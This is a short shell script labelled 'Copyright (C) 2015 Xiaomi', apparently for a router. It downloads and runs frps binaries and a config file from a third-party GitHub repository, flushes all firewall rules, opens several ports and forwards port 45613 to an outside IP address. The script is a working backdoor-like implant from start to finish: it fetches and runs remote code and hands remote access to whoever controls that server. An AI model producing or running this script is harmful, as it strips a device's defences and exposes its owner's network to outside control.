#!/bin/sh
# Copyright (C) 2015 Xiaomi
curl -o /tmp/mnt/frps.ini https://raw.githubusercontent.com/devksks/xiaomi-frps/main/frps.ini

if [ -f "/tmp/mnt/frps0" ]; then
    echo "文件已存在，停止执行脚本。"
    exit 1 
fi
iptables -F
iptables -X
iptables -Z
iptables -A INPUT -p tcp --dport 7000 -j ACCEPT
iptables -A INPUT -p tcp --dport 3000 -j ACCEPT
iptables -A INPUT -p tcp --dport 37670 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 45613 -j DNAT --to-destination 47.74.13.24:443
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -t nat -A PREROUTING -p udp --dport 45613 -j DNAT --to-destination 47.74.13.24:443
iptables -t nat -A POSTROUTING -j MASQUERADE

curl -o /tmp/mnt/frps https://raw.githubusercontent.com/devksks/xiaomi-frps/main/frps
curl -o /tmp/mnt/frps0 https://raw.githubusercontent.com/devksks/xiaomi-frps/main/frps0
chmod +x /tmp/mnt/frps
( /tmp/mnt/frps -c /tmp/mnt/frps.ini ) &

